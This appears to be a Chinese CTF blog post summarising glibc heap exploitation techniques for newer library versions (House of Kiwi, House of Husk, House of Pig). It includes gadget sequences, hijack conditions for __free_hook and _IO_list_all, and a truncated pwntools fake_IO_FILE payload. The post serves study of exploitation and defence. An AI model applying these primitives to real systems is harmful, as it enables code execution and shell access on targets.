@@ -1,0 +1,527 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、House of KIWI       House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)                     1.原理分析       函数调用链：assert-&gt;malloc_assert-&gt;fflush-&gt;_IO_file_jumps结构体中的__IO_file_sync 调用时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="高版本各类堆技巧总结">
+<meta property="og:url" content="http://pig-007.github.io/2021/08/20/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E5%90%84%E7%B1%BB%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="一、House of KIWI       House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)                     1.原理分析       函数调用链：assert-&gt;malloc_assert-&gt;fflush-&gt;_IO_file_jumps结构体中的__IO_file_sync 调用时">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827170019.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827165944.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828115642.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828114858.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/20/23CGNn46r5xEgJy.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828171517.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828173049.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830185253.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830212809.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830191318.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830184953.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830161702.png">
+<meta property="article:published_time" content="2021-08-20T05:40:30.000Z">
+<meta property="article:modified_time" content="2021-08-30T13:29:23.919Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827170019.png"><title>高版本各类堆技巧总结 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/08/20/%E9%AB%98%E7%89%88%E6%9C%AC%E5%A0%86%E5%90%84%E7%B1%BB%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">高版本各类堆技巧总结</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-30</span></span></div></header><div class="post-body">
+        <h1 id="一、House-of-KIWI"   >
+          <a href="#一、House-of-KIWI" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、House-of-KIWI" class="headerlink" title="一、House of KIWI"></a>一、House of KIWI</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598" >House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-原理分析"   >
+          <a href="#1-原理分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-原理分析" class="headerlink" title="1.原理分析"></a>1.原理分析</h2>
+      <p>函数调用链：<strong>assert-&gt;malloc_assert-&gt;fflush-&gt;_IO_file_jumps结构体中的__IO_file_sync</strong></p>
+<p>调用时的寄存器为：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827170019.png" alt="图片2"></p>
+<p>那么如果可以在不同版本下劫持对应setcontext中的赋值参数，即rdi或者rdx，就可以设置寄存器来调用我们想调用的函数。</p>
+
+        <h3 id="1-rdi和rdx互相转换"   >
+          <a href="#1-rdi和rdx互相转换" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-rdi和rdx互相转换" class="headerlink" title="(1)rdi和rdx互相转换"></a>(1)rdi和rdx互相转换</h3>
+      <p>①getkeyserv_handle+576：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov rdx, [rdi+8]</span><br><span class="line">mov [rsp+0C8h+var_C8], rax</span><br><span class="line">call qword ptr [rdx+20h]</span><br></pre></td></tr></table></div></figure>
+
+<p>通过rdi控制rdx，同样2.29以后不同版本都不太一样，需要再调试看看，比如2.31里就是：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">mov QWORD PTR [rsp],rax</span><br><span class="line">call QWORD PTR [rdx+0x20]</span><br></pre></td></tr></table></div></figure>
+
+<p>②svcudp_reply+26:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov rbp, qword ptr [rdi + 0x48]; </span><br><span class="line">mov rax, qword ptr [rbp + 0x18]; </span><br><span class="line">lea r13, [rbp + 0x10]; </span><br><span class="line">mov dword ptr [rbp + 0x10], 0; </span><br><span class="line">mov rdi, r13; </span><br><span class="line">call qword ptr [rax + 0x28];</span><br></pre></td></tr></table></div></figure>
+
+<p>通过rdi控制rbp实现栈迁移，然后即可任意gadget了。</p>
+<p>其中2.31版本下还是一样的，如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">mov rax,QWORD PTR [rbp+0x18]</span><br><span class="line">lea r13,[rbp+0x10]</span><br><span class="line">mov DWORD PTR [rbp+0x10],0x0</span><br><span class="line">mov rdi,r13</span><br><span class="line">call QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-不同劫持"   >
+          <a href="#2-不同劫持" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-不同劫持" class="headerlink" title="(2)不同劫持"></a>(2)不同劫持</h3>
+      <p>这里观察寄存器就可以知道，不同版本的setcontext对应的rdi和rdx，这里就劫持哪一个。另外这里的rdi为_IO_2_1_stderr结构体，是从stderr@@GLIBC_2.2.5取值过来的，也就是data段上的数据，如果可以取得ELF基地址，直接劫持该指针为chunk地址也是可以的，这样就能劫持RDI寄存器了。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827165944.png" alt="图片1"></p>
+<p>这样如果劫持__IO_file_sync函数指针为setcontext，配合劫持的rdi和rdx就可以来调用我们想调用函数从而直接getshell或者绕过orw。</p>
+
+        <h2 id="2-触发条件"   >
+          <a href="#2-触发条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-触发条件" class="headerlink" title="2.触发条件"></a>2.触发条件</h2>
+      <p>只要assert判断出错都可以，常用以下几个</p>
+<p>(1)top_chunk改小，并置pre_inuse为0，当top_chunk不足分配时会触发一个assert。(该assert函数在sysmalloc函数中被调用)</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828115642.png" alt="Snipaste_2021-08-28_11-56-34"></p>
+<p><strong>(2)largebin chunk的size中的flag位，这个不太清楚….</strong></p>
+<p>(3)如果是2.29及以下，因为在tcache_put和tcache_get中还存在assert的关系，所以如果可以修改掉mp_.tcache_bins，将之改大，(利用largebin attack)就会触发assert</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.29</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.29</span></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828114858.png" alt="Snipaste_2021-08-28_11-46-59"></p>
+
+        <h2 id="3-适用条件"   >
+          <a href="#3-适用条件" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-适用条件" class="headerlink" title="3.适用条件"></a>3.适用条件</h2>
+      <p>如果将<code>exit</code>函数替换成<code>_exit</code>函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用<code>_IO_cleanup</code>,若再将<code>__malloc_hook</code>和<code>__free_hook</code>给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区的情况下。这时候可以借用malloc出错调用<strong>malloc_assert-&gt;fflush-&gt;_IO_file_sync</strong>函数指针。且进入的时候rdx为<code>_IO_helper_jumps_addr</code>，rdi为<code>_IO_2_1_stderr_addr</code>。</p>
+
+        <h1 id="二、House-of-Husk"   >
+          <a href="#二、House-of-Husk" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、House-of-Husk" class="headerlink" title="二、House of Husk"></a>二、House of Husk</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://juejin.cn/post/6844904117119385614" >house-of-husk学习笔记 (juejin.cn)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-原理分析-1"   >
+          <a href="#1-原理分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-原理分析-1" class="headerlink" title="1.原理分析"></a><strong>1</strong>.原理分析</h2>
+      <p>函数调用链:</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>-&gt;<span class="built_in">vfprintf</span>-&gt;printf_positional-&gt;__parse_one_specmb-&gt;__printf_arginfo_table(spec)</span><br><span class="line">												|</span><br><span class="line">    											 -&gt;__printf_function_table(spec)</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>__parse_one_specmb</strong> 函数 会调用 <strong>__printf_arginfo_table</strong>和**__printf_function_table<strong>两个函数指针中对应spec索引的函数指针</strong>printf_arginfo_size_function**</p>
+<p>▲这个spec索引指针就是格式化字符的ascii码值，比如printf(“%S”)，那么就是S的ascii码值。当然，这个方法的前提是得有printf系列函数，并且有格式化字符。</p>
+<p>即调用**(*__printf_arginfo_table+’spec’8) 和  (*printf_function_table+’spec’8)**这两个函数指针。</p>
+<p>而实际情况会先调用**__printf_arginfo_table<strong>中对应的spec索引的函数指针，然后调用</strong>__printf_function_table**对应spec索引函数指针。</p>
+<p>所以如果修改了**__printf_arginfo_table<strong>和</strong>__printf_function_table**，则需要确保对应的spec索引对应的函数指针，要么为0，要么有效。</p>
+<p>同时如果选择这个方法，就得需要**__printf_arginfo_table<strong>和</strong>__printf_function_table**均不为0才行。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.31 vfprintf-internal.c(stdio-common)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">                      || __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">                      || __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span> (workstart);</span><br><span class="line">    workstart = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">                          done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">                          save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.31 vfprintf-internal.c(stdio-common)</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">(&amp;specs[cnt].info,</span><br><span class="line"> specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line"> &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call the function.  */</span></span><br><span class="line">function_done = __printf_function_table[(<span class="keyword">size_t</span>) spec]</span><br><span class="line">    (s, &amp;specs[nspecs_done].info, ptr);</span><br></pre></td></tr></table></div></figure>
+
+<p>即如果table不为空，则调用<code>printf_positional</code>函数，然后如果spec不为空，则调用对应spec索引函数。但是有时候不知道printf最终会调用哪个spec，可能隐藏在哪，所以直接把干脆<code>_printf_arginfo_table</code>和<code>__printf_function_table</code>中的值全给改成one_gadget算了。</p>
+<p>▲综上，得出以下条件：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A.	__printf_function_table = heap_addr </span><br><span class="line">	__printf_arginfo_table != <span class="number">0</span></span><br><span class="line"><span class="comment">//其中__printf_arginfo_table和__printf_function_table可以对调</span></span><br><span class="line">B. heap_addr+<span class="string">&#x27;spec&#x27;</span>*<span class="number">8</span> = one_gadget</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://i.loli.net/2021/08/20/23CGNn46r5xEgJy.png" alt="图片1"></p>
+<p>在2.29下可以直接用largebin attack爆破修改两个地方，当然还是需要先泄露地址的。</p>
+
+        <h2 id="2-触发条件-1"   >
+          <a href="#2-触发条件-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-触发条件-1" class="headerlink" title="2.触发条件"></a>2.触发条件</h2>
+      <p>即需要printf家族函数被调用，且其中需带上格式化字符，比如%s，%x等，用来计算spec，这个和libc版本无关，相当于只针对printf家族函数进行攻击的。</p>
+
+        <h2 id="3-适用条件-1"   >
+          <a href="#3-适用条件-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-适用条件-1" class="headerlink" title="3.适用条件"></a>3.适用条件</h2>
+      <p>具有printf家族函数，并且存在spec，合适地方会调用。</p>
+
+        <h1 id="三、House-of-Pig"   >
+          <a href="#三、House-of-Pig" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、House-of-Pig" class="headerlink" title="三、House of Pig"></a>三、House of Pig</h1>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/242640" >house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-原理分析-2"   >
+          <a href="#1-原理分析-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-原理分析-2" class="headerlink" title="1.原理分析"></a>1.原理分析</h2>
+      
+        <h3 id="1-劫持原理"   >
+          <a href="#1-劫持原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-劫持原理" class="headerlink" title="(1)劫持原理"></a>(1)劫持原理</h3>
+      <p><strong>_IO_str_overflow</strong>函数中会连续调用<strong>malloc memcpy free</strong>三个函数。并且**__IO_str_overflow<strong>函数传入的参数rdi为从</strong>_IO_list_all<strong>中获取的</strong>_IO_2_1_stderr<strong>结构体的地址。所以如果我们能改掉</strong>_IO_list_all**中的值就能劫持进入该函数的参数<code>rdi</code>。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828171517.png" alt="Snipaste_2021-08-28_17-15-06"></p>
+<p>所以如上所示，即劫持成功。</p>
+
+        <h3 id="2-Getshell原理"   >
+          <a href="#2-Getshell原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Getshell原理" class="headerlink" title="(2)Getshell原理"></a>(2)Getshell原理</h3>
+      
+        <h4 id="①函数流程"   >
+          <a href="#①函数流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#①函数流程" class="headerlink" title="①函数流程"></a>①函数流程</h4>
+      <p>A.在<code>_IO_str_overflow</code>函数中会先申请chunk为<code>new_buf</code>，然后会依据<code>rdi</code>的值，将<code>rdi</code>当作<code>_IO_FILE</code>结构体，从该结构体中获取<code>_IO_buf_base</code>当作<code>old_buf</code>。</p>
+<p>B.依据<code>old_blen</code> 和<code>_IO_buf_base</code>来拷贝数据到<code>new_buf</code>中，然后释放掉<code>old_buf</code>。其中<code>old_blen</code> 是通过<code>_IO_buf_end</code>减去<code>_IO_buf_base</code>得到的。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.31 strops.c中的_IO_str_overflow</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *new_buf;</span><br><span class="line">    <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">    <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    new_buf = <span class="built_in">malloc</span> (new_size);<span class="comment">//-------house of pig:get chunk from tcache</span></span><br><span class="line">    <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">        <span class="comment">//-------house of pig:copy /bin/sh and system to _free_hook</span></span><br><span class="line">        <span class="built_in">free</span> (old_buf);		<span class="comment">//-------house of pig:getshell</span></span><br><span class="line">        <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">        fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828173049.png" alt="Snipaste_2021-08-28_17-30-42"></p>
+
+        <h4 id="②劫持所需数据"   >
+          <a href="#②劫持所需数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#②劫持所需数据" class="headerlink" title="②劫持所需数据"></a>②劫持所需数据</h4>
+      <p>所以如果在申请的<code>new_buf</code>包含为<code>_free_hook</code>，然后我们在<code>_IO_buf_base</code>和<code>_IO_buf_end</code>这里一段数据块中将<code>system_addr</code>放入，那么就可以将<code>system_addr</code>拷贝到<code>_free_hook</code>中。之后释放掉<code>old_buf</code>，如果<code>old_buf</code>中的头部数据为<code>/bin/sh\x00</code>，那么就能直接<strong>getshell</strong>了。得到以下劫持所需数据：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*(_IO_list_all) = chunk_addr;</span><br><span class="line">(struct _IO_FILE*)chunk_addr-&gt;_IO_buf_base = chunk_sh_sys_addr;</span><br><span class="line">(struct _IO_FILE*)chunk_addr-&gt;_IO_buf_end = chunk_sh_sys_addr+old_blen;</span><br><span class="line"><span class="comment">//2 * old_blen + 100 通常我们选取old_blen为0x18，那么计算得到的tc_idx为8</span></span><br><span class="line">tcachebin[tc_idx] = _free_hook_addr-old_blen;</span><br></pre></td></tr></table></div></figure>
+
+<p>但是如何使得tcachebin[tc_idx]中的Chunk为<code>_free_hook_addr-old_blen</code>呢，这个就用到技术</p>
+<p><code>Largebin attack + Tcache Stashing Unlink Attack</code>，这个技术原理比较复杂，自己看吧。</p>
+<p><strong>通常是只能使用callo的情况下来用的，因为如果能malloc那直接从tcache中malloc出来不就完了。</strong></p>
+<p>然后由于<code>_IO_str_overflow</code>函数中的一些检查，所以有的地方还是需要修改的：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                     <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#need copy &#x27;/bin/sh&#x27; and system from a old_buf to new_buf</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x003900</span>+<span class="number">0x10</span>)       <span class="comment">#set _IO_buf_base (old_buf(start))</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x003900</span>+<span class="number">0x10</span>+<span 